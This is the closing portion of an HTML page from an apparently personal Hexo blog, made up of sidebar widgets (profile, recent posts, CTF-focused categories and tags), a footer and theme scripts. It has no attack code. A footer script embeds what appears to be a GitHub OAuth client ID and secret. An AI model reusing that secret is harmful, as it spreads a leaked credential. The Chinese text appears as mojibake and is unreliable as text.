                    initIntersectionObserver(observerTopMargin * 2)
                    observer.disconnect();
                    return;
                }
                let toActive;
                if (entries[0].intersectionRatio == 1) {  // enter viewed area
                    let entry = entries.reduce((u, v) => (u.target.toc_id > v.target.toc_id ? u : v));  // get the lowest item
                    toActive = $("#toc-item-" + $(entry.target).attr("href").substr(1));
                } else {
                    let entry = entries.reduce((u, v) => (u.target.toc_id < v.target.toc_id ? u : v));  // get the highest item
                    let idx = Math.max(entry.target.toc_id - 1, 0);
                    toActive = $("#toc-item-" + $(headerElems[idx]).attr("href").substr(1));
                }
                if (activeTocItem) activeTocItem.removeClass("is-current");
                activeTocItem = toActive
                activeTocItem.addClass("is-current");
            }
        
            initIntersectionObserver($(document).height() * 2);
            headerElems.each(function (index, obj) {
                obj.toc_id = index;
                scrollObserver.observe(obj);
            })
        });</script></div><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="http://ggb0n.cool/images/header2.jpg" alt="ggb0n"></figure><p class="title is-size-4 is-block line-height-inherit">ggb0n</p><p class="is-size-6 is-block">ä¸€ç”Ÿä¸€ä¸–ï¼Œçˆ±ä½ ä¸€äººã€‚</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>ä¼Ÿå¤§çš„ä¸­å›½</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">24</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">11</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">92</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ggb0n" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Weibo" href="https://weibo.com/u/5955623314"><i class="fab fa-weibo"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:gg.b0n@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Next" href="https://15h3na0.xyz"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D ä¸€è¨€å¥å­è·å–ä¸­...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"æ¥æºã€Š"+data.from+"ã€‹</p><p>æä¾›è€…-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Latest Comment</h3><span class="body_hot_comment">Loading...Wait a Minute!</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recent</h3><article class="media"><a class="media-left" href="/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/wangqiao-top1.jpg" alt="obfs4ç½‘æ¡¥é—®é¢˜çš„å¤„ç†"></p></a><div class="media-content size-small"><p><time dateTime="2020-04-16T01:52:29.000Z">2020-04-16</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/">obfs4ç½‘æ¡¥é—®é¢˜çš„å¤„ç†</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey">Â </i><a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/">çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ </a> / <a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/">obfs4ç½‘æ¡¥æ­å»º</a></p></div></article><article class="media"><a class="media-left" href="/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/cnn-top.jpg" alt="å·ç§¯ç¥ç»ç½‘ç»œCNNå…¥é—¨"></p></a><div class="media-content size-small"><p><time dateTime="2020-04-08T16:16:23.000Z">2020-04-09</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">å·ç§¯ç¥ç»ç½‘ç»œCNNå…¥é—¨</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey">Â </i><a class="link-muted" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">æœºå™¨å­¦ä¹ </a></p></div></article><article class="media"><a class="media-left" href="/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/ml-top.jpg" alt="æœºå™¨å­¦ä¹ åŸºæœ¬çŸ¥è¯†"></p></a><div class="media-content size-small"><p><time dateTime="2020-04-08T16:03:30.000Z">2020-04-09</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">æœºå™¨å­¦ä¹ åŸºæœ¬çŸ¥è¯†</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey">Â </i><a class="link-muted" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">æœºå™¨å­¦ä¹ </a></p></div></article><article class="media"><a class="media-left" href="/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/ftp-top.jpg" alt="FTPæœåŠ¡å™¨æ­å»ºåŠå…¸å‹é—®é¢˜çš„è§£å†³"></p></a><div class="media-content size-small"><p><time dateTime="2020-04-03T01:59:36.000Z">2020-04-03</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/">FTPæœåŠ¡å™¨æ­å»ºåŠå…¸å‹é—®é¢˜çš„è§£å†³</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey">Â </i><a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/">çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ </a> / <a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/">FTPæœåŠ¡å™¨æ­å»º</a></p></div></article><article class="media"><a class="media-left" href="/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/golang-top.png" alt="golangç¼–è¯‘é¡¹ç›®çš„ä¸€ä¸ªå·¨å‘"></p></a><div class="media-content size-small"><p><time dateTime="2020-04-01T02:07:31.000Z">2020-04-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/">golangç¼–è¯‘é¡¹ç›®çš„ä¸€ä¸ªå·¨å‘</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey">Â </i><a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/">çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ </a> / <a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/">obfs4ç½‘æ¡¥æ­å»º</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">CTFå­¦ä¹ è®°å½•</span></span><span class="level-end"><span class="level-item tag">18</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">BUUåˆ·é¢˜</span></span><span class="level-end"><span class="level-item tag">5</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/SQL%E6%B3%A8%E5%85%A5/"><span class="level-start"><span class="level-item">SQLæ³¨å…¥</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CTFHub%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">CTFHubåˆ·é¢˜</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"><span class="level-start"><span class="level-item">æ¯”èµ›åˆ’æ°´</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">èµ›é¢˜å¤ç°</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">æœºå™¨å­¦ä¹ </span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ </span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"><span class="level-start"><span class="level-item">FTPæœåŠ¡å™¨æ­å»º</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/"><span class="level-start"><span class="level-item">obfs4ç½‘æ¡¥æ­å»º</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><a class="level is-mobile is-marginless" href="/categories/"><span class="level-start"><span class="level-item">æŸ¥çœ‹å…¨éƒ¨&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">April 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag is-grey-lightest">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tag">SQLæ³¨å…¥</span><span class="tag is-grey-lightest">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cookie%E6%94%BB%E5%87%BB/"><span class="tag">Cookieæ”»å‡»</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bypass-functions-disable/"><span class="tag">bypass functions_disable</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JWT%E4%BC%AA%E9%80%A0/"><span class="tag">JWTä¼ªé€ </span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RSA%E6%94%BB%E5%87%BB/"><span class="tag">RSAæ”»å‡»</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><span class="tag">ååºåˆ—åŒ–æ¼æ´</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"><span class="tag">å¸ƒå°”ç›²æ³¨</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">æ–‡ä»¶ä¸Šä¼ </span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSRF/"><span class="tag">SSRF</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSTI/"><span class="tag">SSTI</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"><span class="tag">äºŒæ¬¡æ³¨å…¥</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"><span class="tag">æŠ¥é”™æ³¨å…¥</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Machine-Learning/"><span class="tag">Machine Learning</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Neural-Network/"><span class="tag">Neural Network</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"><span class="tag">RSAå…±æ¨¡æ”»å‡»</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tor/"><span class="tag">Tor</span><span class="tag is-grey-lightest">2</span></a></div></div><div class="field is-grouped is-grouped-multiline"><a class="tags has-addons" href="/tags/"><span class="tag">æŸ¥çœ‹å…¨éƒ¨&gt;&gt;</span></a></div></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe to Updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=removeifFeedsId&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="removeifFeedsId" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="Subscribe"></div></div><p class="help">è¾“å…¥é‚®ç®±å¼€å§‹è®¢é˜…ï¼Œæ›´åšåé‚®ä»¶é€šçŸ¥ï¼</p></form></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo1.png" alt="ggb0n&#039;s Blog" height="28"></a><p class="size-small"><span>&copy; 2020 ggb0n</span>Â Â Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>,Modify by <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">removeif</a>Â <br><span>Â© <a href="http://www.beian.miit.gov.cn/" target="_blank">è±«ICPå¤‡20003023å·</a><br></span><span>Â© ç‰ˆæƒè¯´æ˜ï¼š[æœ¬ç½‘ç«™æ‰€æœ‰å†…å®¹å‡æ”¶é›†äºäº’è”ç½‘æˆ–è‡ªå·±åˆ›ä½œ,<br />&nbsp;&nbsp;&nbsp;&nbsp;æ–¹ä¾¿äºç½‘å‹ä¸è‡ªå·±å­¦ä¹ äº¤æµï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·<a href="/message" target="_blank">ç•™è¨€</a>ï¼Œç«‹å³å¤„ç†]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "â¤ï¸Site from <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> has existed <strong>" + dnum + "</strong> d <strong>" + hnum + "</strong> h <strong>" + mnum + "</strong> m <strong>" + snum + "</strong> sï¼â¤ï¸";
        }var now = new Date();setInterval("createTime('2020/02/02 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>â¤ï¸thx <strong><span id="busuanzi_value_site_uv">99+</span></strong> users <strong><span id="busuanzi_value_site_pv">99+</span></strong> visitedï¼â¤ï¸</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'http://ggb0n.cool',
                external_link: {"enable":true,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back-to-top.js" defer></script><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/js/lightgallery-all.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><!--!--><!--!--><!--!--><script src="/js/toc.js" defer></script><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('0a75c84e24da4e774d10','80c72733da730b019e5047ae6c7eff937914a4d9','ggb0n','blog_comment',false);})</script><link rel="stylesheet" href="/css/insight.css"><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>(function (window) {
            var INSIGHT_CONFIG = {
                TRANSLATION: {
                    POSTS: 'Posts',
                    PAGES: 'Pages',
                    CATEGORIES: 'Categories',
                    TAGS: 'Tags',
                    UNTITLED: '(Untitled)',
                },
                CONTENT_URL: '/content.json',
            };
            window.INSIGHT_CONFIG = INSIGHT_CONFIG;
        })(window);</script><script src="/js/insight.js" defer></script></body></html>